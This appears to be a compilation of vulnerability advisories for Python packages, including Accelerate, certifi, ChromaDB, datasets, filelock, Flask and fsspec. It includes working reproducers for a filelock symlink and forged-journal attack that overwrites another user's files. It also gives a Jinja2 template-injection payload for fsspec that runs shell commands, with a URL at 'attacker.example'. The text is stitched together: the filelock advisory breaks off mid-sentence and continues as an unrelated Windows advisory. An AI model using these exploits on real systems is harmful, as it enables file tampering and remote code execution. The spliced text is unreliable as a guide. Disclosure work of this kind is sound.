vulns.description: Hugging Face Accelerate through 1.14.0 contains a path traversal vulnerability in load_checkpoint_in_model and load_checkpoint_and_dispatch functions that fail to sanitize weight_map entries from sharded checkpoint indexes. Attackers can supply relative paths with ../ sequences or absolute paths to read arbitrary files, or point shard entries at named pipes to cause indefinite blocking and denial of service.

Certifi versions before 2026.10.18 include the `emSign ECC Root CA - G3` root certificate in their bundled CA store. Eight eMudhra intermediate CA certificates that chain to this root have compromised private keys and the CA has revoked them.   An attacker with one of the compromised keys can issue valid-looking certificates for any hostname. If the attacker is also on-path, they can intercept or modify TLS traffic from clients that trust the certifi bundle. Examples include `requests`, `urllib3` and `pip`, and the Python.org macOS installer.  Certifi 2026.10.18 removed all emSign roots from the bundle. Certifi 2026.10.19 restored the emSign roots that are not affected. Upgrade to 2026.10.19 or later, and rebuild container images that vendor certifi.

A pre-authentication, code injection vulnerability in version 1.0.0 or later of the ChromaDB Python project allows an unauthenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the /api/v2/tenants/{tenant}/databases/{db}/collections endpoint.

A pre-authentication, code injection vulnerability in version 1.0.0 or later of the ChromaDB Python project allows an unauthenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the /api/v2/tenants/{tenant}/databases/{db}/collections endpoint.

A code injection vulnerability in version 0.4.17 or later of the ChromaDB Python project allows an authenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the /api/v2/tenants/default_tenant/databases/default_database/collections/{collection_id} if they have the UPDATE_COLLECTION permission.

The SimpleRBACAuthorizationProvider authorization provider in versions 0.5.0 or later of the ChromaDB Python project evaluates whether a user holds a given permission but never checks which tenant, database, or collection that permission applies to allowing users to perform cross tenant actions.

A lack of authorization validation in version 0.4.17 or later of the ChromaDB Python project allows any authenticated users to arbitrarily read, write, update, or delete data in any tenant's collection regardless of which tenant they belong to.

Datasets through 5.0.0, fixed in commit f989ef9, contains a path traversal vulnerability in folder-based dataset builders where the file_name metadata field is not properly validated before being joined to the dataset directory. Attackers can supply crafted file_name values with directory traversal sequences to read arbitrary local files, which are then embedded into output when save_to_disk or push_to_hub is called.

`ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) hand SQLite a name they do not control. On Linux the lock validates its database through a descriptor (the number the kernel gives a process for an open file). It then connects SQLite to `/proc/self/fd/<n>`, a Linux path that names the process's own open file `n`. SQLite turns that path back into a plain path and reopens it by name, following symlinks (a symlink is a file that points at another path). On every POSIX route SQLite also acts on `-journal`, `-wal` and `-shm` files it finds beside that name. Those are SQLite's side files: the rollback journal (pages saved to undo an interrupted write), the write-ahead log or WAL (changes kept outside the main file), and the shared-memory index for the WAL.  Another local user who can create or rename entries in the directory that holds the lock database can turn this against the user running the lock (below: the lock user). Such a directory is a `0777` or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). That other user can make the lock user's ordinary `read_lock()` or `write_lock()` write bytes of the other user's choosing into the lock user's own files. The same position lets the other user make that call create or unlink files of the lock user, admit a reader beside a writer, or kill the holder. All of this runs with the lock user's privileges. In a sticky directory such as `/tmp` a planted `-wal` file makes every acquire fail. Affected versions are filelock 3.20.4 through 4.2.0 (the `/proc/self/fd` redirect since 4.0.9, the side-file variants since 3.20.4).  Anthropic's OSS Scanner reported this in private as `ANT-2026-KMJ2575J` [high, CWE-363]: ReadWriteLock: SQLite still follows planted symlinks, overwriting files.  ## Severity  **CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` scores 7.1 (High).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): the planted-journal variant needs no race, and the redirect won 77 of 77 attempts. `I:H` (high integrity impact): the other user writes bytes of their choosing into files of the lock user and unlinks files of their choosing. `A:H` (high availability impact): the other user makes every acquire fail or kills the lock holder. `C:N` (no confidentiality impact): the other user learns nothing. `S:U` (scope unchanged): the effect stays within the lock user's own privileges.  Classification from the external review: **conditional security**, a cross-user effect that exists only when another user can change names in the lock database's directory. The review notes that the 77/77 inotify result (inotify is a Linux interface that reports file events) is stronger evidence than a theoretical TOCTOU (a time-of-check to time-of-use race). The scanner rated it high. The review accepts the mechanism and narrows it to that precondition.  ## Scope and preconditions  - The other party is a different local account that can create or rename entries in the directory that holds the lock database. That is a `0777` directory or a group-writable one (including a setgid `2775` project directory shared with that account), in each case without the sticky bit. The lock user's lock must be able to open the database read-write, so a database the other user creates is `0666`. filelock itself creates the database `0600`. - Sticky directories (`/tmp`, `/var/tmp`, any `1777` directory) narrow the finding rather than exclude it. The redirect and the journal replay do not reach a database the lock user owns there (tested with `fs.protected_regular=2`). What remains is a planted non-empty `<db>-wal` (any mode; a directory or FIFO works too) that the lock user cannot unlink. It makes every acquire raise `sqlite3.OperationalError: disk I/O error`. A hard link (a second name for the same file) to a file of the lock user at the lock path also remains, if `fs.protected_hardlinks=0`. - Two kernel settings matter. `fs.protected_regular` (1 or 2 is the systemd default on most distributions; the kernel's own default is 0) keeps a user from opening a file another user owns in a sticky world-writable directory. Where it is 0, the other user can own the database in `/tmp`, and SQLite follows a planted symlink itself (not tested). `fs.protected_hardlinks=1` (most distributions; kernel default 0) blocks a hard link of a lock user's file onto the lock path. Neither setting affects a non-sticky shared directory. - Platform and route. The `/proc/self/fd` redirect is Linux with `/proc` mounted, 4.0.9 and later. The side-file variants (`-journal`, `-wal`, `-shm`) exist on every POSIX route. On the hard-link route (macOS since 4.1.1 for every connection, Linux without `/proc`) they need the link-directory swap described under "Mechanism", so a non-sticky parent. Neither the scanner nor the review executed on macOS; the statement rests on the platform branch and the identical code after it. Windows does not take this path. - Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky. A user who can rename an entry in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.  ## Affected code  At the scanned commit `b831496b0273`: [`_connect_through_descriptor` builds `/proc/self/fd/<n>` and hands it to `sqlite3.connect`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L982-L1001). The assumption is the [comment at line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), "Descriptor paths reopen the validated inode" (an inode is the kernel's identity for a file, independent of its name). SQLite first reads the file it opened at [`PRAGMA journal_mode=MEMORY`, line 816](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L816). The check in [`_raise_if_database_replaced` at line 836](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L836) runs only after `BEGIN`. Both [`_open_lock_database`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1079-L1091) and [`_raise_if_wal`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1094-L1101) inspect the descriptor, not the file SQLite is on. The one-level hard link of the macOS route is [`_link_beside`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1014-L1029).  ## Introduced  The `/proc/self/fd` redirect came with `4d45e83` ("Merge commit from fork", the fix for GHSA-j8f7-rjxc-mr56), first released in **4.0.9** (verified: `git tag --contains 4d45e83` gives 4.0.9); 4.0.8 does not have it. The side-file variants are older. They reproduce on `cfd4446` ("feat(lock): add SQLite-based ReadWriteLock (#399)"), first released in **3.20.4** (verified), which passed the lock path straight to `sqlite3.connect`.  ## Mechanism  On Linux the lock opens the database with `O_RDWR|O_CREAT|O_NOFOLLOW|O_NONBLOCK`. It checks through the descriptor that the file is a regular file and not a WAL database. It then calls `sqlite3.connect("/proc/self/fd/<n>")` and expects SQLite to reopen the validated inode. SQLite does not open that name. It runs `readlink()` on it, which yields the path string the kernel reports for the descriptor at that moment, and opens that string by path, following every symlink. Without interference the trace shows `readlink("/proc/534/fd/3") = "/tmp/benign/app.lock.db"` and then a second `openat` of that path. The descriptor contributes only a string. Once the directory entry behind the descriptor is gone, the string is `<database> (deleted)`. A symlink with that exact name sends SQLite wherever its creator chose.  The other user prepares the directory before the lock user runs. They create a database `cache.lock.db` (`0666`, so the lock user's lock accepts it) with a second hard link `cache.lock.db.keep`, and the symlink `cache.lock.db (deleted) -> /tmp/victim-notes.txt`. The lock user's `os.open` raises an inotify `IN_OPEN` event. The other user unlinks `cache.lock.db` and links `cache.lock.db.keep` back under the same name. The lock user's descriptor still refers to the unlinked entry, so `/proc/self/fd/3` now reads `/tmp/shared-cache/cache.lock.db (deleted)`. `sqlite3.connect` resolves it, follows the symlink and opens the target `O_RDWR|O_CREAT`. None of filelock's checks look at that file. `_open_lock_database` and `_raise_if_wal` inspect descriptor 3. `_raise_if_database_replaced` compares an `lstat` of the lock path with the descriptor's `(st_dev, st_ino)`, which passes because the other user linked the same inode back, and it runs only after `BEGIN`.  The damage comes from the first statement, `PRAGMA journal_mode=MEMORY`. SQLite finds `<target>-journal`, treats it as the rollback journal of an interrupted transaction, and copies its page records into the target before it checks whether the target is a database at all. The journal header supplies the page size and the page count SQLite resizes the file to. Whoever wrote the journal computed the per-page checksum. The content from offset 0 and the final length are therefore the other user's. Strace of the lock user's process (SQLite 3.40.1):  ``` openat("/tmp/shared-cache/cache.lock.db", O_RDWR|O_CREAT|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC, 0600) = 3 readlink("/proc/3819/fd/3", "/tmp/shared-cache/cache.lock.db (deleted)", 4096) = 41 readlink("/tmp/shared-cache/cache.lock.db (deleted)", "/tmp/victim-notes.txt", 4096) = 21 openat("/tmp/victim-notes.txt", O_RDWR|O_CREAT|O_NOFOLLOW|O_CLOEXEC, 0644) = 4 openat("/tmp/victim-notes.txt-journal", O_RDWR|O_NOFOLLOW|O_CLOEXEC) = 5 pread64(5, "ATTACKER CONTENT WRITTEN BY THE "..., 4096, 516) = 4096 pwrite64(4, "ATTACKER CONTENT WRITTEN BY THE "..., 4096, 0) = 4096 unlink("/tmp/victim-notes.txt-journal") = -1 EPERM            -> "disk I/O error" ```  The redirect itself needs no journal. The constructor's validation connection already makes SQLite open the target with `O_CREAT`. With the symlink pointing at a missing path in the lock user's home, constructing the lock created that file (empty, `0644`, owned by the lock user) and raised nothing. With the symlink pointing at a `0600` WAL-mode SQLite database of the lock user, `write_lock()` returned without error and the database's header bytes 18 and 19 changed from `2 2` to `1 1`. The pragma converted the lock user's database out of WAL mode, and the redirected acquire held its SQLite lock on that database rather than on the lock database.  **Side-file names beside the database.** Two comments record the belief that SQLite names its side files after the descriptor path ([line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), [line 1095](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1095)). The path is not synthetic to SQLite. It derives `<database>-journal`, `<database>-wal` and `<database>-shm` from the resolved real path in the shared directory. `journal_mode=MEMORY` governs only journals SQLite would write, not ones it finds. These variants need no redirect.  *A hot `-journal` makes the lock user unlink a file the journal names; no race.* The other user unlinks the lock user's empty `lock.db`, puts a one-page SQLite database (`0666`) in its place, and writes a 46-byte `lock.db-journal`: a path, its 4-byte length, the 4-byte sum of its bytes and SQLite's journal magic. SQLite treats a journal beside a non-empty database as hot (left by an interrupted transaction). The tail names a "super-journal", and recovery ends by unlinking that file. The lock user's next `read_lock()` or `write_lock()` returns without error and the named file is gone (`unlink("/home/victim/private/notes.txt") = 0`, from a `0700` directory of the lock user). The named file must be a non-empty regular file the lock user can read and unlink. A FIFO planted as `lock.db-journal` instead blocks `read_lock(timeout=2)` in SQLite's `open()` of the journal (still blocked when killed after 10 s).  *A re-planted `-wal` puts the holder in WAL mode past `_raise_if_wal`.* `_raise_if_wal` checks header bytes 18 and 19. Whenever a connection takes its first lock, SQLite stats `<db>-wal`, and if that file and the database are both non-empty it opens the WAL whatever the header says. The pragma at line 816 converts such a database and unlinks `-wal` and `-shm`. The `BEGIN` at line 833 is a separate statement that starts unlocked and stats `<db>-wal` again. Re-creating the 32-byte `-wal` in that gap landed on the first attempt in 20 of 20 runs on a 2-CPU machine.  The lock user's `with lock.write_lock():` then holds the `-shm` byte-120 WAL write lock and only SHARED on the database. Once the other user removes the `-wal`, a second process of the lock user gets `read_lock(timeout=1)` granted while the writer is inside its block, with no exception on either side. SQLite also creates `<db>-shm` with the database's permission bits (`0666`) and keeps it mapped into memory. After the other user truncates it, the writer dies with `SIGBUS` (the signal for touching a mapped file region that no longer exists) in `connection.rollback()` during `release()`.  *A `-wal` in a sticky directory makes every acquire raise; no race, no access to the database.* Beside the lock user's own empty `0600` database, a non-empty `<db>-wal` (one byte, any mode; a directory or FIFO works too) is a leftover SQLite tries to delete. In a `1777` directory the lock user cannot unlink another user's file (`unlink(...) = -1 EPERM`), so the pragma fails with `SQLITE_IOERR_DELETE`. The code in [`_do_acquire_inner`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L763) translates only "database is locked" into `Timeout`. `sqlite3.OperationalError: disk I/O error` therefore leaves every `acquire_read()` / `acquire_write()` (and the async variants) within milliseconds, whatever `timeout` or `blocking` says, until the file's owner or root removes it.  *Further effects observed at this commit in a non-sticky directory.* A `0755` script owned by the lock user, renamed to the lock path with a one-record journal beside it, ends up holding the other user's bytes (the acquire raises `file is not a database`). A hard link to the lock user's `0600` `~/.profile` at the lock path does the same in a sticky `/tmp` when `fs.protected_hardlinks=0`. When the locking process runs as root, SQLite runs `fchown` on a `-wal` or `-shm` it opens to match the owner of the database, so root's `0600` `service.env` renamed to `app.lock.db-wal` belonged to the other user after root's `read_lock()`.  A journal whose super-journal names the database itself makes SQLite open and close a second descriptor on the database, which drops the process's POSIX locks, so `acquire_read` returns with no lock held in `/proc/locks` and a writer in another process acquires (two journals in a row, one per statement; write locks are not affected). A one-byte `lock.db-wal` plus a `lock.db-shm` on which the other user holds two byte locks makes the acquire take 10 s regardless of `timeout` and raise `locking protocol`, or die with `SIGBUS` if the other user truncates the `-shm`.  **The hard-link route in a directory without the sticky bit.** None of the above occurs on the `_link_beside` branch (macOS, Linux without `/proc`). There SQLite's main file is `.filelock-…/lock.db` in the connecting user's `0700` directory. That protection holds only where no other user can rename the `.filelock-*` entry itself, because `0700` protects the contents, not the entry in the parent. `_link_beside` checks the link once and returns a pathname, and every later use is by that name.  With `/proc` hidden in a `0777` directory, the other user staged a directory holding a hard link `lock.db` to a one-page database and a hot `lock.db-journal`. They held `BEGIN EXCLUSIVE` on the database so the lock user's first statement waited in the busy handler (SQLite's retry loop for a locked database), renamed the lock user's `.filelock-*` directory aside, renamed the staged directory onto its name and rolled back. SQLite got SHARED, found the journal under the swapped name and unlinked the file it named. The lock user's process reported the lock held and exited 0. A polling variant without the write lock also won (in 40 trials the file was gone after 1 to 26 starts of the lock user's program). Under the sticky bit the rename fails with `EPERM`.  ## Reproduction  The scanner's reproducer for `ANT-2026-KMJ2575J`, quoted as received. It ran against commit `b831496b0273`.  **`repro`**  ```python #!/usr/bin/env python3 import os import shutil import subprocess import sys  as_victim = {"user": "victim", "group": "victim", "extra_groups": []} as_attacker = {"user": "attacker", "group": "attacker", "extra_groups": []}  # set up: the lock database lives in a shared cache directory, 0777 and not sticky shared_dir = "/tmp/shared-cache" lock_db = shared_dir + "/cache.lock.db" shutil.rmtree(shared_dir, ignore_errors=True) os.mkdir(shared_dir) os.chmod(shared_dir, 0o777)  # set up: a private 0600 file of the victim's in sticky /tmp, which the attacker cannot write target = "/tmp/victim-notes.txt" for leftover in (target, target + "-journal"):     if os.path.lexists(leftover):         os.unlink(leftover) original = b"original victim notes
" with open(target, "wb") as notes:     notes.write(original) shutil.chown(target, "victim", "victim") os.chmod(target, 0o600) direct_write = subprocess.run(     [sys.executable, "-c", "import sys; open(sys.argv[1], 'r+b')", target], capture_output=True, text=True, **as_attacker ) print("attacker opening the target for writing:", direct_write.stderr.strip().splitlines()[-1]) assert direct_write.returncode != 0  # attack: a hot journal beside the target, and a redirect of the victim's SQLite from the lock database to the target content = "ATTACKER CONTENT WRITTEN BY THE VICTIM'S ReadWriteLock
" subprocess.run([sys.executable, "/tmp/repro.d/plant_hot_journal.py", target, content], check=True, **as_attacker) redirect = subprocess.Popen(     [sys.executable, "/tmp/repro.d/redirect_lock_db.py", lock_db, target], stdout=subprocess.PIPE, text=True, **as_attacker ) assert redirect.stdout.readline() == "ready
"  # the victim takes its read lock; the attacker races each acquire, so the victim runs up to 20 times for run in range(1, 21):     victim = subprocess.run(         [sys.executable, "/tmp/repro.d/victim_app.py", lock_db], capture_output=True, text=True, timeout=60, **as_victim     )     with open(target, "rb") as notes:         after = notes.read()     if after != original:         break redirect.kill() redirect.wait()  # check: taking a lock on cache.lock.db must leave the victim's notes alone print(f"victim run {run}: exit status {victim.returncode}:", (victim.stderr.strip() or "no error").splitlines()[-1]) status = os.stat(target) print("target owner, mode, size:", status.st_uid, oct(status.st_mode & 0o7777), status.st_size) print("target before:", original) print("target after: ", after[:60]) print("BUG" if after == content.encode().ljust(4096, b"\0") else "OK") ```  **`repro.d/plant_hot_journal.py`**  ```python #!/usr/bin/env python3 """The attacker: leave a rollback journal beside TARGET whose one record restores TARGET's first page to CONTENT."""  import os import struct import sys  target, content = sys.argv[1], sys.argv[2].encode() journal_path = target + "-journal"  # https://www.sqlite.org/fileformat2.html#the_rollback_journal JOURNAL_MAGIC = bytes.fromhex("d9d505f920a163d7") page_size, sector_size, nonce = 4096, 512, 0x11223344 record_count = 1 pages_after_rollback = 1  # SQLite truncates TARGET to this many pages header = JOURNAL_MAGIC + struct.pack(">IIIII", record_count, nonce, pages_after_rollback, sector_size, page_size)  page_number = 1  # page 1 starts at offset 0 page_image = content.ljust(page_size, b"\0") # SQLite's pager_cksum(): the nonce plus every 200th byte, counting down from page_size - 200 checksum = (nonce + sum(page_image[i] for i in range(page_size - 200, 0, -200))) & 0xFFFFFFFF record = struct.pack(">I", page_number) + page_image + struct.pack(">I", checksum)  with open(journal_path, "wb") as journal:     journal.write(header.ljust(sector_size, b"\0") + record) os.chmod(journal_path, 0o666)  # the victim's SQLite opens a hot journal O_RDWR ```  **`repro.d/redirect_lock_db.py`**  ```python #!/usr/bin/env python3 """The attacker: make the victim's SQLite, connecting through /proc/self/fd/<n>, open TARGET instead of LOCK_DB."""  import ctypes import os import sys  lock_db, target = sys.argv[1], sys.argv[2] spare_name = lock_db + ".keep"  # the attacker creates the lock database, world-writable so that the victim's ReadWriteLock accepts it os.close(os.open(lock_db, os.O_CREAT | os.O_WRONLY)) os.chmod(lock_db, 0o666) os.link(lock_db, spare_name)  # what /proc/<pid>/fd/<n> reads back as once the name the descriptor was opened through is unlinked os.symlink(target, lock_db + " (deleted)")  IN_OPEN = 0x20 libc = ctypes.CDLL(None, use_errno=True) inotify = libc.inotify_init1(0) if libc.inotify_add_watch(inotify, lock_db.encode(), IN_OPEN) < 0:     raise OSError(ctypes.get_errno(), "inotify_add_watch", lock_db) print("ready", flush=True)  while True:     os.read(inotify, 4096)  # the victim's ReadWriteLock has opened the database and is validating its descriptor     os.unlink(lock_db)     os.link(spare_name, lock_db)  # the same inode back at the path, so filelock's later lstat sees no change ```  **`repro.d/victim_app.py`**  ```python #!/usr/bin/env python3 """The victim: an application that takes its shared read lock once, as in docs/how-to.rst."""  import sys  from filelock import ReadWriteLock  rw = ReadWriteLock(sys.argv[1]) with rw.read_lock(timeout=5):     pass ```  ## Attack sequence  The redirect, with `A` the other local user:  ```mermaid sequenceDiagram     participant A as other local user     participant V as lock user's process (filelock)     participant S as SQLite inside that process     participant K as kernel and filesystem     rect rgb(255, 214, 214)         Note over A,K: filelock 4.0.9 to 4.2.0 on Linux, lock directory 0777 without the sticky bit         A->>K: create cache.lock.db (0666) and a second hard link cache.lock.db.keep         A->>K: symlink "cache.lock.db (deleted)" pointing at /tmp/victim-notes.txt         A->>K: write /tmp/victim-notes.txt-journal (hot rollback journal, one page record)         V->>K: open(cache.lock.db, O_RDWR O_CREAT O_NOFOLLOW) gives fd 3, fstat says regular, header not WAL         K-->>A: inotify IN_OPEN on cache.lock.db         A->>K: unlink(cache.lock.db) then link(cache.lock.db.keep, cache.lock.db)         V->>S: sqlite3.connect("/proc/self/fd/3")         S->>K: readlink(/proc/self/fd/3) returns "cache.lock.db (deleted)"         S->>K: open("cache.lock.db (deleted)") follows the symlink to victim-notes.txt         V->>S: PRAGMA journal_mode=MEMORY         S->>K: open(victim-notes.txt-journal), pread page 1, pwrite it at offset 0 of victim-notes.txt         Note over V,K: victim-notes.txt (0600, 22 bytes) is now the other user's 4096-byte page image, the lock user sees "disk I/O error"         V->>K: lstat(cache.lock.db) matches fd 3 identity, so On Windows the soft locks (`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async forms, and a `FileLock` that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each `acquire()` attempt that finds a marker opens it with `os.open` to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.  Another local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every `acquire()` by the user running the lock (below: the lock user) then waits inside the open, past its `timeout`, `blocking=False` and `cancel_check`, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. Before it a soft lock created its marker with `O_CREAT | O_EXCL` and never opened an existing one. #476 read the marker on Windows through `CreateFileW` and broke a stale one with `Path.rename` and `Path.unlink`. These wait for an oplock as `os.open` does, because none of them passes `FILE_COMPLETE_IF_OPLOCKED`, an `NtCreateFile` option that returns instead of waiting. The read became the `os.open` in `_read_lock_file` with [bfbfa76](https://github.com/tox-dev/filelock/commit/bfbfa76) ([#548](https://github.com/tox-dev/filelock/pull/548), 3.29.1) and the break moved into `break_lock_file` with [d244c6d](https://github.com/tox-dev/filelock/commit/d244c6d) ([#551](https://github.com/tox-dev/filelock/pull/551), 3.29.2); the by-path calls stayed.  ## Mechanism  Each attempt of `_acquire` first calls `os.open(path, O_WRONLY | O_CREAT | O_EXCL)`. On an existing marker that fails with `EEXIST` (or `EACCES` on Windows) at once; the same-account probe shows the failed exclusive create returning at once under an oplock too. `_acquire` then calls `_try_break_stale_lock`, which calls `_read_lock_file`: `os.lstat`, then `os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK)`. On Windows `O_NOFOLLOW` and `O_NONBLOCK` do not exist (the code reads them with `getattr(os, ..., 0)`), and `os.open` calls `CreateFileW`. When another handle holds a Level 1 or batch oplock on the file, that call sends the holder a break request and returns only when the holder acknowledges it or closes its handle. `_check_give_up` tests the deadline after the attempt returns, so the wait overruns `timeout`, `blocking=False` and `cancel_check` by its length. Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.  A marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. Nothing in the retry loop bounds this wait.  ## Reproduction  The review's reproducers, quoted as received. `oplock_vm.py` section `[2]` is this finding; sections `[1a]` and `[1b]` belong to the `release()` advisory. `oplock_semantics_vm.py` is the same-account probe of which path operations wait. A stale marker under that oplock is not broken, so no process acquires the lock while the holder keeps its handle. With `AsyncSoftFileLock(run_in_executor=False)` the wait is on the event loop thread and stops every task in the process; with the default executor one worker thread waits. The documentation names a soft lock as the option for network filesystems, after verification on the mount, and `FileLock` is a soft lock on builds without `fcntl` and after its `ENOSYS` fallback. Mutual exclusion is not affected and nothing other than the marker is read, written or deleted.  ## Workarounds  - Keep soft-lock markers in a directory whose ACL grants other accounts no access to new files: a directory inside the user profile, or one with inheritance removed and only the owner, `SYSTEM` and `Administrators` granted (`icacls <dir> /inheritance:r /grant:r "<owner>:(OI)(CI)F" "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F"`). `mode` does not do this on Windows. - Run `AsyncSoftFileLock` with the default executor rather than `run_in_executor=False`, so that only a worker thread waits. - No `timeout`, `blocking` or `cancel_check` value bounds the wait.  ## Patched version  4.2.1. When the `session` object is accessed, Flask should set the `Vary: Cookie` header. This instructs caches not to cache the response, as it may contain information specific to a logged in user. This is handled in most cases, but some forms of access such as the Python `in` operator were overlooked.  The severity depends on the application's use of the session, and the cache's behavior regarding cookies. The risk depends on all these conditions being met.  1. The application must be hosted behind a caching proxy that does not ignore responses with cookies. 2. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached. 3. The application accesses the session in a way that does not access the values, only the keys, and does not mutate the session.

Flask is a web server gateway interface (WSGI) web application framework. In versions 3.1.2 and below, when the session object is accessed, Flask should set the Vary: Cookie header., resulting in a Use of Cache Containing Sensitive Information vulnerability. The logic instructs caches not to cache the response, as it may contain information specific to a logged in user. This is handled in most cases, but some forms of access such as the Python in operator were overlooked. The severity and risk depend on the application being hosted behind a caching proxy that doesn't ignore responses with cookies, not setting a Cache-Control header to mark pages as private or non-cacheable, and accessing the session in a way that only touches keys without reading values or mutating the session. The issue has been fixed in version 3.1.3.

### Summary  `fsspec.implementations.reference.ReferenceFileSystem` parses a "references" JSON document (Kerchunk format) supplied either inline or via a URL. The parser renders fields from this JSON through **un-sandboxed** `jinja2.Template(...).render(...)` calls in three locations. An attacker who controls the JSON document — typically by hosting it at a URL that the victim opens with `fsspec.filesystem("reference", fo=URL)` or via `xarray.open_dataset("reference://...")` — achieves arbitrary Python code execution on the victim machine, before any data is read.  This mirrors the pattern of [CVE-2024-34359](https://nvd.nist.gov/vuln/detail/CVE-2024-34359) in `llama-cpp-python`, where externally-sourced template strings were rendered with the default unrestricted Jinja2 environment.  ### Affected versions  All versions of `fsspec` from `0.9.0` onward (vulnerable code introduced in commit `0fb8d56b684ee74ad9ad4587fd560bde1b116450`, 2021-03-12). Confirmed on the latest released version `2025.10.0`.  ### Affected sinks  All in `fsspec/implementations/reference.py`:  | Sink | Location | Trigger | |---|---|---| | A — `_process_references1._render_jinja` | lines 1016-1018 | `simple_templates=False` and a `refs` entry contains `{{` | | B — `_process_templates` (lambda) | lines 1043-1053 | `templates` dict has values containing `{{`, invoked later via render context | | C — `_process_gen` | lines 1075-1083 | references JSON contains a `gen` array (always reached, regardless of `simple_templates`) |  Sink C is the most severe: it is reached unconditionally for any references JSON that includes a `gen` field.  The vulnerable code:  ```python # fsspec/implementations/reference.py # Sink A @lru_cache(1000) def _render_jinja(u):     return jinja2.Template(u).render(**self.templates)  # <- unsandboxed  # Sink B def _process_templates(self, tmp):     ...     for k, v in tmp.items():         if "{{" in v:             import jinja2             self.templates[k] = lambda temp=v, **kwargs: jinja2.Template(                 temp                                       # <- unsandboxed             ).render(**kwargs)  # Sink C def _process_gen(self, gens):     ...     for pr in products:         import jinja2         key = jinja2.Template(gen["key"]).render(**pr, **self.templates)        # <- unsandboxed         url = jinja2.Template(gen["url"]).render(**pr, **self.templates)        # <- unsandboxed         if ("offset" in gen) and ("length" in gen):             offset = int(jinja2.Template(gen["offset"]).render(...))            # <- unsandboxed             length = int(jinja2.Template(gen["length"]).render(...))            # <- unsandboxed ```  ### Proof of concept (Sink C, minimal)  Save as `poc.py`:  ```python import http.server, json, socketserver, threading, time, fsspec from pathlib import Path  PAYLOAD = "{{ joiner.__init__.__globals__.os.popen('touch /tmp/fsspec_pwned_$(whoami)').read() }}" REF = {     "version": 1, "templates": {}, "refs": {"x": "x"},     "gen": [{         "key": PAYLOAD + "/{{ i }}", "url": "http://example.com/{{ i }}",         "offset": "0", "length": "0", "dimensions": {"i": [0]},     }], }  body = json.dumps(REF).encode() class H(http.server.BaseHTTPRequestHandler):     def do_GET(self):         self.send_response(200); self.end_headers(); self.wfile.write(body)     def log_message(self, *a, **kw): pass  srv = socketserver.TCPServer(("127.0.0.1", 0), H) threading.Thread(target=srv.serve_forever, daemon=True).start() url = f"http://127.0.0.1:{srv.server_address[1]}/refs.json"  for p in Path("/tmp").glob("fsspec_pwned_*"): p.unlink() try:     fsspec.filesystem("reference", fo=url) except Exception as e:     print("exception:", e) srv.shutdown() time.sleep(0.3) print("markers:", list(Path("/tmp").glob("fsspec_pwned_*"))) ```  Run:  ``` pip install fsspec aiohttp requests jinja2 python3 poc.py # → markers: [PosixPath('/tmp/fsspec_pwned_<user>')] ```  ### End-to-end via xarray (real-world consumer pathway)  ```python import xarray as xr ds = xr.open_dataset(     "reference://",     engine="zarr",     backend_kwargs={         "consolidated": False,         "storage_options": {             "fo": "http://attacker.example/refs.json",             "remote_protocol": "http",         },     }, ) # RCE fires before any data is materialised. ```  ### Tested on  - fsspec 2025.10.0, jinja2 3.1.6, Python 3.9, macOS 14 - fsspec 2025.10.0, jinja2 3.1.6, Python 3.12-slim, Docker Linux  ### Impact  `fsspec.ReferenceFileSystem` is the canonical entrypoint for the **Kerchunk** format, widely used in the Pangeo / Earth-observation / climate data-science ecosystem to provide cloud-optimised views of 